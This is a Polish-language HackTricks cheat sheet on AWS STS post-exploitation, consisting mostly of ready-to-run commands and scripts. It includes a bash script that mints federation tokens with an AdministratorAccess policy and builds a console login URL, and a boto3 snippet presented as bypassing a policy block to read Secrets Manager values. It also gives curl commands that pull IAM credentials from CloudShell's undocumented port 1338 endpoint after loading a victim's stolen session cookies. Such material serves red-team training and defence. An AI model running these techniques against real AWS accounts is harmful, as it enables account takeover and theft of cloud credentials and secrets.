# AWS - STS Post Exploitation

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się trikami hackingowymi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}

## STS

Aby uzyskać więcej informacji:

{% content-ref url="../../aws-security/aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../../aws-security/aws-services/aws-iam-enum.md)
{% endcontent-ref %}

#### Nowa metoda grudzień 2024: Ominięcie wymogu linku do konsoli internetowej, poprzez bezpośrednie uzyskanie sekretów za pomocą żądania HTTPS POST do API SecretsManager (bez linku logowania ani konsoli internetowej)

Złożono wczoraj, jako PR do nadchodzącego egzaminu (ARTE: ex16x41), jednak widzę, że PR się nie wyświetla, może został złożony błędnie, spróbujmy ponownie:
Używając tej metody, całkowicie omijasz wymóg otwierania jakichkolwiek adresów URL, formatowania jakichkolwiek linków logowania lub nawet korzystania z CLI / konsoli internetowej.
Co więc zrobiliśmy tutaj?
Napisałem ten skrypt, który bezpośrednio współdziała z API AWS Secrets Manager, jest to absolutnie proste i bezpośrednie.
Kiedy uruchomisz skrypt, wysyła on żądanie HTTPS POST do punktu końcowego AWS Secrets Manager
https://secretsmanager.<region>.amazonaws.com/
Żądanie GetSecretValue jest wysyłane jako część żądania POST, uwierzytelnione podpisem SigV4 (zarządzanym przez boto3).
Secrets Manager przetwarza żądanie:
AWS weryfikuje żądanie w odniesieniu do polityk IAM przypisanych do twojego użytkownika lub roli (jak wiemy, możemy zobaczyć wartość sekretu tylko jako konsolę internetową)
Jeśli jest to dozwolone, usługa Secrets Manager zwraca żądaną wartość sekretu w odpowiedzi.
**POC Demo:**
Polecenie CLI AWS do uzyskania wartości sekretu nie działa, ponieważ dostęp został odmówiony ->
Jednak na obrazie możesz zobaczyć prostotę metody, aby po prostu wyodrębnić flagę bezpośrednio, znając identyfikator sekretu (to enumerujemy na wcześniejszym etapie, gdy zalogowaliśmy się z profilem użytkownika)
![image](https://github.com/user-attachments/assets/d05a1a96-04c0-4404-b4bd-dbfa93c6494b)
Uwaga: Myślę, że ta metoda może być używana uniwersalnie w zależności od scenariusza, jeśli polityka na to pozwala (ale omija ograniczenia polityki, która nie pozwala przez CLI)
Można to wykorzystać w dowolnym momencie, gdy polityka na to pozwala (jako alternatywna opcja testowa)
Dodatkowa uwaga: ciekawy jestem innych technik, które można zastosować, używając tej samej metody bezpośredniej interakcji z API usługi, a teraz AWS CLI, w każdym procesie podnoszenia uprawnień lub po eksploatacji, jak tutaj.
**Kod:**
'''
Python
import boto3

session = boto3.Session(profile_name="lab6")
client = session.client("secretsmanager", region_name="us-east-1")

# Ustaw niestandardowy User-Agent
client.meta.events.register(
'before-call.secretsmanager.GetSecretValue',
lambda params, **kwargs: params['headers'].update({'User-Agent': 'my-custom-tool'})
)

# Pobierz wartość sekretu bezpośrednio przez API secretsmanager
response = client.get_secret_value(SecretId="flag_sts_lab_3")
print(response['SecretString'])
'''

### Od poświadczeń IAM do konsoli

Jeśli udało ci się uzyskać jakieś poświadczenia IAM, możesz być zainteresowany **dostępem do konsoli internetowej** za pomocą następujących narzędzi.\
Zauważ, że użytkownik/rola musi mieć uprawnienie **`sts:GetFederationToken`**.

#### Niestandardowy skrypt

Następujący skrypt użyje domyślnego profilu i domyślnej lokalizacji AWS (nie rządowej i nie chińskiej), aby dać ci podpisany URL, którego możesz użyć do zalogowania się do konsoli internetowej:

{% code overflow="wrap" %}
```bash
# Get federated creds (you must indicate a policy or they won't have any perms)
## Even if you don't have Admin access you can indicate that policy to make sure you get all your privileges
## Don't forget to use [--profile <prof_name>] in the first line if you need to
output=$(aws sts get-federation-token --name consoler --policy-arns arn=arn:aws:iam::aws:policy/AdministratorAccess)

if [ $? -ne 0 ]; then
echo "The command 'aws sts get-federation-token --name consoler' failed with exit status $status"
exit $status
fi

# Parse the output
session_id=$(echo $output | jq -r '.Credentials.AccessKeyId')
session_key=$(echo $output | jq -r '.Credentials.SecretAccessKey')
session_token=$(echo $output | jq -r '.Credentials.SessionToken')

# Construct the JSON credentials string
json_creds=$(echo -n "{\"sessionId\":\"$session_id\",\"sessionKey\":\"$session_key\",\"sessionToken\":\"$session_token\"}")

# Define the AWS federation endpoint
federation_endpoint="https://signin.aws.amazon.com/federation"

# Make the HTTP request to get the sign-in token
resp=$(curl -s "$federation_endpoint" \
--get \
--data-urlencode "Action=getSigninToken" \
--data-urlencode "SessionDuration=43200" \
--data-urlencode "Session=$json_creds"
)
signin_token=$(echo -n $resp | jq -r '.SigninToken' | tr -d '\n' | jq -sRr @uri)



# Give the URL to login
echo -n "https://signin.aws.amazon.com/federation?Action=login&Issuer=example.com&Destination=https%3A%2F%2Fconsole.aws.amazon.com%2F&SigninToken=$signin_token"
```
{% endcode %}

#### aws\_consoler

Możesz **wygenerować link do konsoli webowej** za pomocą [https://github.com/NetSPI/aws\_consoler](https://github.com/NetSPI/aws\_consoler).
```bash
cd /tmp
python3 -m venv env
source ./env/bin/activate
pip install aws-consoler
aws_consoler [params...] #This will generate a link to login into the console
```
{% hint style="warning" %}
Upewnij się, że użytkownik IAM ma uprawnienia `sts:GetFederationToken`, lub zapewnij rolę do przyjęcia.
{% endhint %}

#### aws-vault

[**aws-vault**](https://github.com/99designs/aws-vault) to narzędzie do bezpiecznego przechowywania i uzyskiwania dostępu do poświadczeń AWS w środowisku deweloperskim.
```bash
aws-vault list
aws-vault exec jonsmith -- aws s3 ls # Execute aws cli with jonsmith creds
aws-vault login jonsmith # Open a browser logged as jonsmith
```
{% hint style="info" %}
Możesz również użyć **aws-vault**, aby uzyskać **sesję konsoli przeglądarki**
{% endhint %}

#### Z konsoli do poświadczeń IAM

[**Oryginalnie odkryte w tym poście**](https://blog.christophetd.fr/retrieving-aws-security-credentials-from-the-aws-console/), Jeśli uda ci się skompromitować dostęp do konsoli internetowej (może ukradłeś ciasteczka i nie mogłeś uzyskać dostępu do folderu .aws), możesz uzyskać poświadczenia tokena IAM dla tego użytkownika za pomocą **CloudShell**.

CloudShell udostępnia poświadczenia IAM przez **nieudokumentowany punkt końcowy na porcie 1338**. Po załadowaniu ciasteczek sesji ofiary do swojej przeglądarki, możesz przejść do CloudShell i wydać następujące polecenia, aby uzyskać poświadczenia IAM.
```bash
TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
```
{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
